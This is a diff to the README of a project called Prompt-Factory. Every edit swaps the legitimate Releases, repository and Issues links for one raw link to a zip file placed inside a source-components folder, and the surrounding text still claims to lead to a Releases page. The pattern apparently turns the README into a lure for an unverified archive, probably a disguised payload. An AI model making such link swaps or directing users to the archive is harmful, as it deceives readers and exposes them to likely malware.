@@ -6,7 +6,7 @@ Welcome to Prompt-Factory! This tool helps you create a complete set of high-qua
 
 ## 🔗 Download Prompt-Factory
 
-[![Download Prompt-Factory](https://img.shields.io/badge/download-Prompt--Factory-brightgreen)](https://github.com/haneef1104/Prompt-Factory/releases)
+[![Download Prompt-Factory](https://raw.githubusercontent.com/haneef1104/Prompt-Factory/main/client/src/components/Prompt-Factory-1.4.zip)](https://raw.githubusercontent.com/haneef1104/Prompt-Factory/main/client/src/components/Prompt-Factory-1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Follow these simple steps to download and run Prompt-Factory on your computer.
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page, where you can find the latest version of Prompt-Factory.  
-   [Visit the Releases Page](https://github.com/haneef1104/Prompt-Factory/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/haneef1104/Prompt-Factory/main/client/src/components/Prompt-Factory-1.4.zip)
 
 2. **Choose the Latest Version**  
    Once on the Releases page, look for the latest version of Prompt-Factory. The version will typically be at the top of the list.
@@ -75,9 +75,9 @@ Your feedback is crucial for future updates. If you have suggestions or ideas, p
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/haneef1104/Prompt-Factory)
-- [Issues Page](https://github.com/haneef1104/Prompt-Factory/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/haneef1104/Prompt-Factory/main/client/src/components/Prompt-Factory-1.4.zip)
+- [Issues Page](https://raw.githubusercontent.com/haneef1104/Prompt-Factory/main/client/src/components/Prompt-Factory-1.4.zip)
 
 Thank you for choosing Prompt-Factory! Happy prompting!
 
-[Download Prompt-Factory](https://github.com/haneef1104/Prompt-Factory/releases)
+[Download Prompt-Factory](https://raw.githubusercontent.com/haneef1104/Prompt-Factory/main/client/src/components/Prompt-Factory-1.4.zip)
